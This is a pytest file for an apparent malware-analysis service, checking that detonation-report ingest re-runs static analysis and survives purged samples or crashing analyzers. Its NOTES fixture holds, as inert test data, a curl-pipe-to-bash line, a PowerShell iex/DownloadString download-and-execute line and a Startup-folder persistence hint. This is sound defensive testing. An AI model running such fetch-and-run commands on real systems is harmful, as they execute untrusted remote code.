"""A verdict must come from one engine, not two.

`ingest_report` rebuilt the static half of a job purely from the JSON already on
the row. The detonation arrives minutes to days after the static pass, so the
two halves of a single verdict could be produced by two different builds of the
engine — and nothing in the report said so.

It showed up as a hole in the operator's upgrade path. Re-scoring the database
after a rules change walks the jobs and re-runs the pipeline, but it must skip
anything still waiting on a guest: re-analysing a job the worker is about to
report on races that write. Those jobs then came back from ingest carrying the
findings the sweep existed to remove.

Measured on this deployment. A sweep re-scored 412 jobs and cleared the
"installer carries executables" false positive from seven of the eight MSIs in
the corpus. The eighth, `sample_093.msi`, was in the queue as the sweep went
past, was detonated eleven minutes later, and came back still reading

    generic.embedded_executable        malicious

with the fixed engine running in the container the whole time.

The bytes are in quarantine and the static tier costs milliseconds, so ingest
re-runs it. If retention has purged the sample there is nothing to re-run and
the stored findings stand — a detonation is far too expensive to lose over a
missing input.
"""
from __future__ import annotations

import pytest

from app.engine.analyzers import scripts
from tests.test_api import WORKER_TOKEN, _poll_until_done, _submit

#: Reads as a download-and-execute to the script analyzer, in a file the
#: operating system will never execute. Which of those two facts wins is exactly
#: what the rules change under test decides.
NOTES = (
    b"Deployment notes\n\n"
    b"Fetch and run the installer:\n"
    b"    curl https://example.org/install.sh | bash\n"
    b"Then add it to the Startup folder so it survives a reboot.\n"
    b"iex (New-Object Net.WebClient).DownloadString('https://example.org/s')\n"
)

REPORT = {
    "engine": "capev2",
    "worker": "detonation-01",
    "ran": True,
    "unavailable_reason": None,
    "refused": False,
    "signals": [],
    "facts": {"task_id": 91},
    "iocs": {},
    "duration_ms": 41000,
    "timeline": [],
}


@pytest.fixture()
def old_rules(monkeypatch):
    """The engine as it was before `.txt` counted as prose."""
    monkeypatch.setattr(
        scripts, "PROSE_EXTENSIONS", scripts.PROSE_EXTENSIONS - {".txt"}
    )


def _report(client, public_id: str) -> dict:
    response = client.post(
        f"/api/dynamic/report/{public_id}",
        json=REPORT,
        headers={"X-Worker-Token": WORKER_TOKEN},
    )
    assert response.status_code == 200, response.text
    return response.json()


def _script_ids(detail: dict) -> set[str]:
    return {s["id"] for s in (detail["analysis"].get("script") or {}).get("signals", [])}


def test_a_rules_change_reaches_a_job_that_was_in_the_queue(
    client, auth, old_rules, monkeypatch
) -> None:
    public_id = _submit(client, auth, "notes.txt", NOTES)
    _poll_until_done(client, auth, public_id)

    before = client.get(f"/api/result/{public_id}", headers=auth).json()
    assert "script.download_and_execute" in _script_ids(before), (
        "the fixture did not reproduce the old behaviour, so the test proves nothing"
    )

    # The operator ships the fix and re-scores the database. This job is with a
    # guest, so the sweep passes it by. Then the report lands.
    monkeypatch.setattr(
        scripts, "PROSE_EXTENSIONS", scripts.PROSE_EXTENSIONS | {".txt"}
    )
    after = _report(client, public_id)

    ids = _script_ids(after)
    assert "script.download_and_execute" not in ids, (
        f"ingest re-published the old static finding: {sorted(ids)}"
    )
    assert "document.mentions_remote_payload" in ids, sorted(ids)


def test_the_detonation_is_still_there_afterwards(client, auth) -> None:
    """The re-run must not cost what it was merged with."""
    public_id = _submit(client, auth, "notes.txt", NOTES)
    _poll_until_done(client, auth, public_id)
    after = _report(client, public_id)

    assert after["tiers"]["dynamic"]["ran"] is True
    assert "dynamic.capev2" in after["analysis"]
    assert after["analysis"]["dynamic.capev2"]["facts"]["task_id"] == 91


def test_a_purged_sample_still_gets_its_report(client, auth, monkeypatch) -> None:
    """Retention races detonation. The report is the expensive half."""
    public_id = _submit(client, auth, "loader.exe", b"MZ" + b"\x00" * 8192)
    _poll_until_done(client, auth, public_id)
    before = client.get(f"/api/result/{public_id}", headers=auth).json()

    from app.api import dynamic as dynamic_api

    real_root = dynamic_api.quarantine_root
    monkeypatch.setattr(dynamic_api, "quarantine_root", lambda: real_root() / "gone")
    after = _report(client, public_id)

    assert after["tiers"]["dynamic"]["ran"] is True
    assert set(after["analysis"]) >= set(before["analysis"]), (
        "static findings were dropped when the bytes were unavailable"
    )


def test_a_raising_analyzer_does_not_cost_the_report(client, auth, monkeypatch) -> None:
    """Same contract, different failure: the re-run itself blows up."""
    public_id = _submit(client, auth, "loader.exe", b"MZ" + b"\x00" * 8192)
    _poll_until_done(client, auth, public_id)
    before = client.get(f"/api/result/{public_id}", headers=auth).json()

    from app.engine import analyzers as analyzers_mod

    def _boom(*_args, **_kwargs):
        raise RuntimeError("analyzer exploded")

    monkeypatch.setattr(analyzers_mod, "run_all", _boom)
    after = _report(client, public_id)

    assert after["tiers"]["dynamic"]["ran"] is True
    assert set(after["analysis"]) >= set(before["analysis"])
